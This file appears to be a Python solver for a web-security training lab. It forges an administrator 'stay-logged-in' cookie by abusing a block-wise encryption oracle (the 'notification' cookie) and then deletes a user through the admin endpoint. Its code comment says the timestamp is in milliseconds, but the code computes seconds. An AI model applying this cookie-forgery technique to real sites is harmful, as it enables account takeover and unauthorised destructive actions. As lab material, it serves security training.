from web_security_academy.core.logger import logger
from base64 import b64encode, b64decode
from urllib.parse import quote, unquote
from time import time_ns


def solve_lab(session):
    # Plaintext "stay-logged-in" cookies are of the
    # form <username>:<epoch time in milliseconds>
    time_ms = time_ns() // (10**9)
    prefix = "Invalid email address: "
    padding = " " * (32 - len(prefix))
    plaintext = f"administrator:{time_ms}"

    # The "notification" cookie is an encrypted message of
    # the form "Invalid email address: " + <email address>
    csrf = session.get_csrf_token("/post?postId=1")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": "comment",
        "name": "user",
        "email": padding + plaintext,
    }
    session.post_path("/post/comment", data=data)
    logger.info("Sent a POST request to /post/comment with the following data:")
    logger.info(data)

    notification_cookie = session.cookies.get("notification")
    logger.info('Received the following "notification" cookie')
    logger.info(notification_cookie)

    # Explanation: The oracle's algorithm encrypts every 16 bytes of plaintext
    # independent of each other. Therefore, we can encrypt arbitrary messages
    # by ensuring the plaintext starts on an index divisible by 16.

    # Strip "notification" cookie of prefix + padding
    encrypted_cookie = notification_cookie
    encrypted_cookie = unquote(encrypted_cookie)
    encrypted_cookie = b64decode(encrypted_cookie)
    encrypted_cookie = encrypted_cookie[32:]

    # Base64 + URL encode stripped cookie
    encrypted_cookie = b64encode(encrypted_cookie)
    encrypted_cookie = encrypted_cookie.decode()
    encrypted_cookie = quote(encrypted_cookie)
    logger.info('Stripped "notification" cookie of prefix + padding')

    session.cookies.set("stay-logged-in", encrypted_cookie)
    logger.info(f'Set "stay-logged-in" cookie to {encrypted_cookie}')

    session.get_path("/admin/delete?username=carlos")
    logger.success('Deleted user "carlos"')
